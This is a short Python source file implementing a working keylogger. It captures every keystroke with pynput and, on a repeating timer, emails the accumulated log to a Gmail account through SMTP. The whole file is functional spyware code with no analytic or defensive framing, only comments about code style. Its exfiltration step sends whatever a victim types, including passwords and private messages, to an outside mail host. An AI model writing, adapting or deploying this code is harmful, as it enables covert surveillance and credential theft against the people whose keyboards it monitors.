import pynput.keyboard
import threading
import smtplib

class Keylogger():
  #we created this constructor method to avoid global variable ("log" here ) again and again
  def __init__(self, time_interval, email, password):
    self.log=""
    self.interval=time_interval
    self.email=email
    self.password=password
    self.start()
  
  def sender(self, email, password, message):
    server=smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()
  
  #this method is used to avoid using log+= str(key.char) or " " and make our code clean
  def append_string(self, string):
    self.log=self.log+ string

  #this method just log key events
  def keyevent(self, key):
      try:
        self.append_string(str(key.char))
      except AttributeError:
        if key==key.space:
          self.append_string(" ")
        else:
          self.append_string(" "+ str(key)+ " ")
  #this method reports key event after a specified time period
  def report(self):
      self.sender(self.email, self.password, "\n\n" + self.log)
      self.log=""
      logging=threading.Timer(self.interval, self.report)
      logging.start()
  
  #this method act as a trigger to run this program
  def start(self):
    keyboard_listener= pynput.keyboard.Listener(on_press=self.keyevent)
    with keyboard_listener:
      self.report()
      keyboard_listener.join()

